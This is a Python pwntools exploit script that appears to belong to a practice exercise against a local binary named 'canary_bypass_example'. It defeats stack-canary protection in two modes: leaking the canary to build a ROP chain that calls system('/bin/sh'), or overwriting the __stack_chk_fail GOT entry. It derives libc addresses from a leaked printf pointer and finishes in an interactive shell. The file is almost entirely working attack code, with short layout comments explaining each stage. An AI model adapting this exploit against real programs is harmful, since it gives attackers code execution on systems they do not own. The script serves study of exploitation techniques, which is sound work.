import sys
import pwn

sys.path.append('../../MyTools')
import gadgets_info
import conversion

def usage():
	print('--------------------------------')
	print('| python ./exploit.py [option] |')
	print('| options:                     |')
	print('| c: canary leak               |')
	print('| h: hijack __stack_chk_fail   |')
	print('--------------------------------')

def arg_check(arg):
	print('[--] tips: arg = {0}'.format(arg))
	if arg != 'c' and arg != 'h':
		return -1
	return 0

def usage_error():
	print('[--] tips: incorrect usage')
	usage()
	exit()

def payload4leak_get():
	payload = b'A' * (target_info['bufA2stack'] - target_info['addr_len'] + 0x1)
	return payload

def call_system_rop_get():
	payload = pwn.p64(target_info['libc_base'] + target_info['pop_rdi_ret_offset'])
	payload += pwn.p64(target_info['libc_base'] + target_info['sh_str_offset'])
	payload += pwn.p64(target_info['libc_base'] + target_info['pop_rdi_ret_offset'] + target_info['pop_rdi_len'])
	payload += pwn.p64(target_info['libc_base'] + target_info['system_offset'])
	payload += pwn.p64(target_info['libc_base'] + target_info['exit_offset'])
	return payload

def payload4rop_with_canary_get(canary):
	payload = b'A' * (target_info['bufB_size'] + target_info['bufA2stack'] - target_info['addr_len'])
	payload += canary
	payload += b'B' * target_info['addr_len'] 
	payload += call_system_rop_get()
	
	return payload

'''
stage one (leak canary):
| buffer A  | canary | caller rbp | callee return |
| padding   | leak   |            |               |

stage two (pwn):
| buffer B | buffer A  | canary    | caller rbp | callee return |
| padding  | padding   | leak info | padding    | rop chain     |

canary is correct, __stack_chk_fail cannot detect the anomaly
'''

def pwn4canary():
	conn.sendafter(b'please enter user name: \n', payload4leak_get())
	leak4canary = conn.recvline()
	canary = leak4canary[0x4c:0x53]
	canary = b'\x00' + canary
	print('[++] receive: canary = {0}'.format(hex(conversion.bytes2int(canary))))

	conn.sendafter(b'please enter password: \n', payload4rop_with_canary_get(canary))

def payload4rop_get():
	payload = b'A' * target_info['bufC2stack']
	payload += b'B' * target_info['addr_len'] 
	payload += call_system_rop_get()
	return payload

def addr2modify_get():
	return pwn.p64(target_info['stack_check_got_plt_addr'])

def new_value_get():
	return pwn.p64(target_info['libc_base'] + target_info['pop_rdi_ret_offset'] + target_info['pop_rdi_len'])

'''
stage one (rop):
| buffer  | canary  | caller rbp | callee return |
| padding | padding | padding    | rop chain     |

stage two (set address):
| var                                |
| .got.plt(__stack_chk_fail) address |

stage three (modify the data stored at the .got.plt):
| var       |
| new value |

when the function returns, .got.plt no longer points to __stack_chk_fail, and the check function has failed.
'''

def pwn4hijack():
	conn.sendlineafter(b'please enter message: \n', payload4rop_get())
	conn.sendlineafter(b'please enter address: \n', addr2modify_get())
	conn.sendlineafter(b'please enter value: \n', new_value_get())

pwn.context.clear()
pwn.context.update(
	arch = 'amd64', os = 'linux'
)

target_info = {
	'exec_path': './canary_bypass_example',
	'exec_mode': '-',
	'exec_info': None,
	'libc_info': None,
	'addr_len': 0x8,
	'bufB_size': 0xc,
	'bufA2stack': 0x40,
	'bufC2stack': 0x14,
	'libc_base': 0x0,
	'sh_str_offset': 0x0,
	'system_offset': 0x0,
	'exit_offset': 0x0,
	'pop_rdi_ret_offset': 0x0,
	'pop_rdi_len': 0x1,
	'stack_check_got_plt_addr': 0x0,
}

if len(sys.argv) != 2 or arg_check(sys.argv[1]) != 0:
	usage_error()

target_info['exec_mode'] = sys.argv[1]
print('[--] tips: current mode = {0}'.format(target_info['exec_mode']))

target_info['exec_info'] = pwn.ELF(target_info['exec_path'])
target_info['libc_info'] = pwn.ELF(target_info['exec_path']).libc

target_info['stack_check_got_plt_addr'] = target_info['exec_info'].got['__stack_chk_fail']
target_info['system_offset'] = target_info['libc_info'].sym['system']
target_info['exit_offset'] = target_info['libc_info'].sym['exit']
target_info['sh_str_offset'] = target_info['libc_info'].search(b'/bin/sh').__next__()

print('[--] tips: may need update new offset')
target_info['pop_rdi_ret_offset'] = gadgets_info.linux_adm64_gadgets['pop_rdi_ret_offset']

conn = pwn.process(argv = [target_info['exec_path'], target_info['exec_mode']])

leak4printf = conn.recvline()
print('[++] receive: leak info = {0}'.format(leak4printf[:-1].decode()))
random_addr = conversion.str2int(leak4printf[16:-1].decode())
target_info['libc_base'] = random_addr - target_info['libc_info'].sym['printf']
print('[**] libc base address = {0}'.format(hex(target_info['libc_base'])))

if target_info['exec_mode'] == 'c':
	pwn4canary()
elif target_info['exec_mode'] == 'h':
	pwn4hijack()
else:
	usage_error()

conn.interactive()
